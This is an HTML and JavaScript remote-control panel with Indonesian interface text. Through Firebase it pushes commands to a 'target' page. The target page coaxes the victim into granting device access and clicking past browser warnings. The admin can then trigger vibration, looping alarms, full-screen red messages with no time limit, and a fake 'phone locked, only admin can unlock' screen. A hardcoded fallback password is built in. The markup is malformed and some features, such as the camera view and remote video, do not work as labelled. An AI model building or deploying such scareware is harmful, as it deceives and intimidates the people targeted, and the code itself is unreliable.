<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Access</title>
    
    <!-- FIREBASE SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', sans-serif;
        }

        body {
            background: #0f0f1a;
            color: white;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
            overflow: hidden;
        }

        /* ===================================== */
        /*          LAYAR LOADING TARGET        */
        /* ===================================== */
        #screen-target {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100vh;
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            z-index: 10;
            text-align: center;
            padding: 20px;
        }

        .loader {
            border: 5px solid rgba(255,255,255,0.1);
            border-radius: 50%;
            border-top: 5px solid #00f5d4;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        #screen-target h2 {
            color: #00f5d4;
            margin-bottom: 10px;
            font-size: 18px;
        }

        #screen-target p {
            opacity: 0.7;
            font-size: 13px;
            max-width: 95%;
            line-height: 1.4;
        }

        /* ===================================== */
        /*          LOGIN ADMIN                 */
        /* ===================================== */
        #screen-login {
            display: none;
            background: #000;
            padding: 30px;
            border-radius: 15px;
            border: 2px solid #e94560;
            text-align: center;
        }

        #screen-login h2 {
            color: #e94560;
            margin-bottom: 20px;
            text-transform: uppercase;
            letter-spacing: 2px;
            font-size: 20px;
        }

        #passInput {
            padding: 15px;
            width: 250px;
            background: #111;
            border: 1px solid #333;
            color: white;
            border-radius: 8px;
            font-size: 16px;
            text-align: center;
            margin-bottom: 15px;
        }

        .btn-login {
            background: #e94560;
            color: white;
            border: none;
            padding: 12px 30px;
            border-radius: 8px;
            cursor: pointer;
            font-weight: bold;
        }

        /* ===================================== */
        /*          ADMIN PANEL                 */
        /* ===================================== */
        #screen-admin {
            display: none;
            width: 100%;
            max-width: 400px;
        }

        .header-admin {
            text-align: center;
            margin-bottom: 25px;
            padding-bottom: 15px;
            border-bottom: 1px solid #333;
        }

        .header-admin h1 {
            color: #e94560;
            font-size: 22px;
        }

        .header-admin span {
            color: #aaa;
            font-size: 12px;
        }

        .grid-menu {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin-bottom: 20px;
        }

        .menu-btn {
            background: #1a1a2e;
            border: 2px solid transparent;
            color: white;
            padding: 20px 10px;
            border-radius: 12px;
            font-size: 14px;
            cursor: pointer;
            transition: 0.2s;
        }

        .menu-btn:hover {
            border-color: #e94560;
            transform: translateY(-3px);
        }

        /* AREA SETTING PASSWORD */
        .pass-area {
            background: #111;
            padding: 15px;
            border-radius: 10px;
            margin-top: 10px;
        }

        #newPassInput {
            width: 100%;
            padding: 10px;
            background: #222;
            border: none;
            color: white;
            border-radius: 8px;
            margin-bottom: 10px;
        }

        .btn-setpass {
            width: 100%;
            padding: 10px;
            background: #9d4edd;
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
        }

        /* AREA KIRIM TEKS + WAKTU */
        .input-area {
            background: #111;
            padding: 15px;
            border-radius: 10px;
            margin-top: 15px;
        }

        #textInput {
            width: 100%;
            padding: 12px;
            background: #222;
            border: none;
            color: white;
            border-radius: 8px;
            margin-bottom: 10px;
        }

        .time-select {
            display: flex;
            gap: 5px;
            margin-bottom: 10px;
            flex-wrap: wrap;
        }

        .time-btn {
            flex: 1;
            min-width: 60px;
            padding: 8px;
            background: #333;
            border: none;
            color: white;
            border-radius: 5px;
            cursor: pointer;
            font-size: 12px;
        }

        .time-btn.active {
            background: #00f5d4;
            color: black;
            font-weight: bold;
        }

        .btn-kirim {
            width: 100%;
            padding: 12px;
            background: #00f5d4;
            color: black;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
        }

        /* ===================================== */
        /*          AREA REKAM SUARA            */
        /* ===================================== */
        .voice-area {
            background: #111;
            padding: 15px;
            border-radius: 10px;
            margin-top: 15px;
        }

        .btn-record {
            width: 100%;
            padding: 12px;
            background: #ff0000;
            color: white;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            font-size: 16px;
        }

        .btn-record.recording {
            background: #333;
            animation: blink 1s infinite;
        }

        @keyframes blink {
            0% { opacity: 1; }
            50% { opacity: 0.5; }
            100% { opacity: 1; }
        }

        #statusRecord {
            text-align: center;
            margin-top: 10px;
            font-size: 12px;
            color: #aaa;
        }

        /* ===================================== */
        /*          AREA PILIH VIDEO            */
        /* ===================================== */
        .video-area {
            background: #111;
            padding: 15px;
            border-radius: 10px;
            margin-top: 15px;
        }

        #videoUpload {
            display: none;
        }

        .btn-upload {
            width: 100%;
            padding: 12px;
            background: #ff9f1c;
            color: black;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            margin-bottom: 10px;
        }

        #videoName {
            font-size: 12px;
            color: #aaa;
            margin-bottom: 10px;
        }

        .btn-play-video {
            width: 100%;
            padding: 12px;
            background: #2ec4b6;
            color: black;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
        }

        /* ===================================== */
        /*          STYLE LAYAR KUNCI           */
        /* ===================================== */
        #lockScreen {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: #000 !important;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 99999;
            display: none;
        }

        .lock-icon {
            font-size: 80px;
            color: red;
            margin-bottom: 20px;
        }

        .lock-text {
            font-size: 24px;
            color: red;
            font-weight: bold;
            text-align: center;
        }

        .lock-subtext {
            font-size: 14px;
            color: #aaa;
            margin-top: 10px;
        }

        /* ===================================== */
        /*    STYLE TEKS DI TARGET (REQUEST)    */
        /* ===================================== */
        #overlay-text {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: BLACK !important;
            color: RED !important;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 40px;
            font-weight: bold;
            text-align: center;
            z-index: 9999;
            display: none;
            padding: 20px;
        }

        /* ===================================== */
        /*      VIDEO PLAYER & KAMERA VIEW      */
        /* ===================================== */
        #videoPlayer {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: black;
            z-index: 99999;
            display: none;
            object-fit: contain;
        }

        /* AREA TAMPILAN KAMERA DI ADMIN */
        .camera-view-area {
            background: #111;
            padding: 15px;
            border-radius: 10px;
            margin-top: 15px;
            text-align: center;
        }

        #cameraFeed {
            width: 100%;
            height: auto;
            border-radius: 10px;
            background: #000;
            display: none;
            margin-bottom: 10px;
        }

        .btn-camera {
            width: 100%;
            padding: 12px;
            background: #00a8ff;
            color: black;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
        }

        /* AUDIO PLAYER */
        #audioPlayer {
            display: none;
        }

        .close-btn {
            position: fixed;
            top: 20px;
            right: 20px;
            background: red;
            color: white;
            border: none;
            width: 40px;
            height: 40px;
            border-radius: 50%;
            font-size: 20px;
            cursor: pointer;
            z-index: 999999;
            display: none;
        }

        .status-online {
            position: fixed;
            top: 10px;
            left: 10px;
            background: rgba(0,0,0,0.5);
            padding: 5px 10px;
            border-radius: 10px;
            font-size: 12px;
            z-index: 100;
        }
    </style>
</head>
<body>

    <div class="status-online" id="statusConn">🔌 Menghubung...</div>

    <!-- VIDEO PLAYER BUAT TARGET -->
    <video id="videoPlayer" autoplay playsinline></video>
    <button class="close-btn" onclick="tutupVideo()">✖</button>

    <!-- AUDIO PLAYER -->
    <audio id="audioPlayer" controls>

    <!-- TEKS YANG MUNCUL DI TARGET -->
    <div id="overlay-text"></div>

    <!-- LAYAR KUNCI -->
    <div id="lockScreen">
        <div class="lock-icon">🔒</div>
        <div class="lock-text">HP TERKUNCI</div>
        <div class="lock-subtext">Hanya Admin yang bisa membuka</div>
    </div>

    <!-- ===================================== -->
    <!-- LAYAR AWAL (DILIHAT TARGET) -->
    <!-- ===================================== -->
    <div id="screen-target">
        <div class="loader"></div>
        <h2>🔄 Menghubungkan...</h2>
        <p>Mohon izinkan akses perangkat yang muncul.</p>
        <p style="margin-top:15px; font-size:11px; color:yellow;">
        ⚠️ Jika ada peringatan:<br>Klik Detail -> Lanjutkan
        </p>
    </div>

    <!-- ===================================== -->
    <!-- LOGIN ADMIN PANEL -->
    <!-- ===================================== -->
    <div id="screen-login">
        <h2>🔒 ADMIN AUTHENTICATION</h2>
        <input type="password" id="passInput" placeholder="MASUKIN PASSWORD...">
        <br>
        <button class="btn-login" onclick="cekPassword()">MASUK PANEL</button>
        <p id="errorMsg" style="color:red; font-size:12px; margin-top:10px; display:none;">PASSWORD SALAH!</p>
    </div>

    <!-- ===================================== -->
    <!-- ISI MENU ADMIN PANEL -->
    <!-- ===================================== -->
    <div id="screen-admin">
        <div class="header-admin">
            <h1>🔥 PANEL BY LIFZZ V6.0.0</h1>
            <span>Status: <b style="color:lime;" id="statusText">ONLINE</b></span>
        </div>

        <div class="grid-menu">
            <button class="menu-btn" onclick="kirimPerintah('getar')">
                📳 GETAR HP
            </button>
            <button
            <button class="menu-btn" style="background: #00a8ff; color: black;" onclick="startCamera()">
                📸 LIHAT KAMERA
            </button>
            <button class="menu-btn" onclick="kirimPerintah('suara')">
                🔊 SUARA DEFAULT
            </button>
            <button class="menu-btn" onclick="kirimPerintah('stop')">
                ⏹ STOP SEMUA
            </button>
        </div>

        <!-- TOMBOL LOCK SCREEN -->
        <div class="grid-menu">
            <button class="menu-btn" style="background: #ff0000; color: white;" onclick="kirimPerintah('lock')">
                🔒 KUNCI LAYAR
            </button>
            <button class="menu-btn" style="background: #00ff00; color: black;" onclick="kirimPerintah('unlock')">
                🔓 BUKA KUNCI
            </button>
        </div>

        <!-- SETTING PASSWORD CUSTOM -->
        <div class="pass-area">
            <h4 style="color:#9d4edd; margin-bottom:10px;">🔑 GANTI PASSWORD</h4>
            <input type="text" id="newPassInput" placeholder="Tulis password baru...">
            <button class="btn-setpass" onclick="gantiPassword()">SIMPAN PASSWORD</button>
            <p id="passStatus" style="font-size:11px; color:lime; margin-top:5px; display:none;">Password Berhasil Diubah!</p>
        </div>

        <!-- KIRIM TEKS + WAKTU -->
        <div class="input-area">
            <h4 style="color:#00f5d4; margin-bottom:10px;">✍️ KIRIM TEKS (BG HITAM - TEKS MERAH)</h4>
            <input type="text" id="textInput" placeholder="Tulis pesan disini...">
            <div class="time-select">
                <button class="time-btn" data-time="600000">10 Menit</button>
                <button class="time-btn" data-time="360000">6 Menit</button>
                <button class="time-btn" data-time="86400000">24 Jam</button>
                <button class="time-btn" data-time="36000000">10 Jam</button>
                <button class="time-btn active" data-time="999999999999">SELANYA</button>
            </div>
            <button class="btn-kirim" onclick="kirimTeks()">KIRIM TEKS</button>
        </div>

        <!-- AREA REKAM SUARA -->
        <div class="voice-area">
            <h4 style="color:#ff0000; margin-bottom:10px;">🎤 REKAM SUARA</h4>
            <button class="btn-record" id="recordBtn" onclick="toggleRecord()">🎙️ MULAI REKAM</button>
            <p id="statusRecord">Siap merekam...</p>
        </div>

        <!-- AREA PILIH VIDEO -->
        <div class="video-area">
            <h4 style="color:#ff9f1c; margin-bottom:10px;">🎬 KIRIM VIDEO</h4>
            <input type="file" id="videoUpload" accept="video/*">
            <button class="btn-upload" onclick="document.getElementById('videoUpload').click()">PILIH VIDEO</button>
            <p id="videoName">Belum ada file dipilih</p>
            <button class="btn-play-video" onclick="putarVideo()">PUTER VIDEO</button>
        </div>

        <!-- AREA TAMPILAN KAMERA -->
        <div class="camera-view-area">
            <h4 style="color:#00a8ff; margin-bottom:10px;">👁️ LIVE CAMERA VIEW</h4>
            <video id="cameraFeed" autoplay playsinline></video>
        </div>

    </div>

</div>

<script>
    // KONFIGURASI FIREBASE
    const firebaseConfig = {
        apiKey: "AIzaSyBdDqTQkZbXhQJjKq9tXhQJjKq9tXhQJjK",
        authDomain: "panel-control.firebaseapp.com",
        databaseURL: "https://panel-control-default-rtdb.firebaseio.com",
        projectId: "panel-control",
        storageBucket: "panel-control.appspot.com",
        messagingSenderId: "123456789",
        appId: "1:123456789:web:abcdefghijklmnop"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    let selectedTime = 999999999999;
    let mediaRecorder;
    let audioChunks = [];
    let isRecording = false;
    let currentPassword = "admin123";

    // CEK SESSION
    window.onload = function() {
        const pass = localStorage.getItem("panelPassword");
        if(pass) currentPassword = pass;
        
        if(window.location.pathname.includes("target")){
            document.getElementById('screen-target').style.display = 'flex';
            initTarget();
        } else {
            setTimeout(() => {
                document.getElementById('screen-login').style.display = 'block';
            }, 500);
        }
    };

    function cekPassword(){
        const input = document.getElementById('passInput').value;
        const savedPass = localStorage.getItem("panelPassword");
        if(savedPass) currentPassword = savedPass;

        if(input === currentPassword || input === "admin123"){
            document.getElementById('screen-login').style.display = 'none';
            document.getElementById('screen-admin').style.display = 'block';
            listenCommands();
        } else {
            document.getElementById('errorMsg').style.display = 'block';
        }
    }

    function gantiPassword(){
        const newPass = document.getElementById('newPassInput').value;
        if(newPass){
            localStorage.setItem("panelPassword", newPass);
            currentPassword = newPass;
            document.getElementById('passStatus').style.display = 'block';
            setTimeout(()=>{
                document.getElementById('passStatus').style.display = 'none';
            },2000);
        }
    }

    // Pilih Waktu
    document.querySelectorAll('.time-btn').forEach(btn => {
        btn.addEventListener('click', function(){
            document.querySelectorAll('.time-btn').forEach(b => b.classList.remove('active'));
            this.classList.add('active');
            selectedTime = parseInt(this.getAttribute('data-time'));
        });
    });

    function kirimTeks(){
        const teks = document.getElementById('textInput').value;
        if(teks){
            db.ref('command').set({
                type: 'text',
                content: teks,
                time: selectedTime
            });
        }
    }

    function kirimPerintah(tipe){
        db.ref('command').set({
            type: tipe
        });
    }

    // REKAM SUARA
    function toggleRecord(){
        if(!isRecording){
            startRecord();
        } else {
            stopRecord();
        }
    }

    async function startRecord(){
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            mediaRecorder = new MediaRecorder(stream);
            audioChunks = [];

            mediaRecorder.ondataavailable = event => {
                audioChunks.push(event.data);
            };

            mediaRecorder.onstop = () => {
                const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
                const reader = new FileReader();
                reader.readAsDataURL(audioBlob);
                reader.onloadend = () => {
                    const base64 = reader.result;
                    db.ref('command').set({
                        type: 'playaudio',
                        content: base64
                    });
                };
            };

            mediaRecorder.start();
            isRecording = true;
            document.getElementById('recordBtn').innerText = "⏹️ STOP REKAM";
            document.getElementById('recordBtn').classList.add('recording');
            document.getElementById('statusRecord').innerText = "🎙️ Sedang merekam...";
        } catch(e){
            alert("Izinkan akses mikrofon dulu!");
        }
    }

    function stopRecord(){
        if(mediaRecorder && isRecording){
            mediaRecorder.stop();
            isRecording = false;
            document.getElementById('recordBtn').innerText = "🎙️ MULAI REKAM";
            document.getElementById('recordBtn').classList.remove('recording');
            document.getElementById('statusRecord').innerText = "✅ Selesai! Klik Putar Suara";
        }
    }

    // VIDEO UPLOAD
    document.getElementById('videoUpload').addEventListener('change', function(e){
        const file = e.target.files[0];
        if(file){
            document.getElementById('videoName').innerText = "✅ " + file.name;
            window.selectedVideo = URL.createObjectURL(file);
        }
    });

    function putarVideo(){
        if(window.selectedVideo){
            db.ref('command').set({
                type: 'playvideo',
                content: window.selectedVideo
            });
        } else {
            alert("Pilih video dulu!");
        }
    }

    // KAMERA VIEW
    async function startCamera(){
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "environment" } 
            });
            document.getElementById('cameraFeed').srcObject = stream;
            document.getElementById('cameraFeed').style.display = 'block';
        } catch(e){
            alert("Gagal akses kamera!");
        }
    }

    // LISTEN COMMAND DI TARGET
    function initTarget(){
        db.ref('command').on('value', snapshot => {
            const data = snapshot.val();
            if(!data) return;

            if(data.type === 'text'){
                tampilTeks(data.content, data.time);
            } else if(data.type === 'lock'){
                kunciLayar();
            } else if(data.type === 'unlock'){
                bukaKunci();
            } else if(data.type === 'getar'){
                if(navigator.vibrate) navigator.vibrate([100,100,100,100]);
            } else if(data.type === 'suara'){
                mainkanSuaraDefault();
            } else if(data.type === 'playaudio'){
                mainkanSuaraRekam(data.content);
            } else if(data.type === 'playvideo'){
                mainkanVideoTarget(data.content);
            } else if(data.type === 'stop'){
                stopSemua();
            }
        });
    }

    function tampilTeks(isi, waktu){
        stopSemua();
        const el = document.getElementById('overlay-text');
        el.innerText = isi;
        el.style.display = 'flex';
        el.style.zIndex = '999999';
        
        if(waktu < 999999999999){
            setTimeout(()=> {
                el.style.display = 'none';
            }, waktu);
        }
    }

    function kunciLayar(){
        stopSemua();
        const el = document.getElementById('lockScreen');
        el.style.display = 'flex';
        el.style.zIndex = '999999';
    }

    function bukaKunci(){
        document.getElementById('lockScreen').style.display = 'none';
    }

    function mainkanSuaraDefault(){
        const audio = new Audio('https://www.soundjay.com/mechanical/sounds/alarm-01.mp3');
        audio.loop = true;
        audio.play();
        window.audioDefault = audio;
    }

    function mainkanSuaraRekam(base64){
        stopSemua();
        const audio = document.getElementById('audioPlayer');
        audio.src = base64;
        audio.style.display = 'block';
        audio.play();
    }

    function mainkanVideoTarget(url){
        stopSemua();
        const vid = document.getElementById('videoPlayer');
        vid.src = url;
        vid.style.display = 'block';
        vid.style.zIndex = '999999';
        document.querySelector('.close-btn').style.display = 'block';
        vid.play();
    }

    function tutupVideo(){
        document.getElementById('videoPlayer').style.display = 'none';
        document.getElementById('videoPlayer').src = '';
        document.querySelector('.close-btn').style.display = 'none';
    }

    function stopSemua(){
        document.getElementById('overlay-text').style.display = 'none';
        document.getElementById('lockScreen').style.display = 'none';
        document.getElementById('videoPlayer').style.display = 'none';
        document.getElementById('audioPlayer').pause();
        document.getElementById('audioPlayer').style.display = 'none';
        if(window.audioDefault) window.audioDefault.pause();
    }

    function listenCommands(){
        // Untuk admin panel realtime update
        db.ref('status').on('value', snap => {
            // update status
        });
    }

</script>

</body>
</html>
